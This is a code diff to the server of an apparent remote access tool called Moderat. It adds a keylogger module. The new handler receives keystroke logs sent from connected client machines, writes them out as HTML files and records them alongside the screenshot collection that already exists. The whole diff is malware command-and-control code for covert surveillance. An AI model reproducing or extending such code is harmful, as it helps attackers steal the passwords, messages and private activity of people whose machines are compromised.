@@ -4,8 +4,10 @@ from twisted.internet import reactor
 from ClientsManagment import ClientsManagment
 from ModeratorsManagment import ModeratorsManagment
 from ScreenshotsManager import ScreenshotsManager
+from KeyloggerManager import KeyloggerManager
 
 from PhotoFactory import save_image
+from KeyFactory import html_generator
 
 import logging
 from logging.handlers import RotatingFileHandler
@@ -37,6 +39,7 @@ log.addHandler(fh)
 manageClients = ClientsManagment()
 manageModerators = ModeratorsManagment()
 manageScreenshots = ScreenshotsManager()
+manageKeylogs = KeyloggerManager()
 
 # Clear Clients Status
 manageClients.set_status_zero()
@@ -156,6 +159,12 @@ class ModeratServerProtocol(Protocol):
             screen_path, name, window_title, date = save_image(screen_info, key, DATA_STORAGE)
             manageScreenshots.save_image(key, name, screen_path, window_title, date)
             log.info('Screenshot Saved (%s)' % key)
+
+        elif mode == 'keyloggerLogs':
+            keylogger_info = ast.literal_eval(payload)
+            html_path = html_generator(key, keylogger_info, DATA_STORAGE)
+            manageKeylogs.save_keylog(key, keylogger_info['window_title'], keylogger_info['time'], html_path)
+            log.info('Keylogs Saved (%s)' % key)
 
         elif moderators.has_key(session_id):
             log.info('Send Data to Moderator (%s)' % moderators[session_id]['username'])
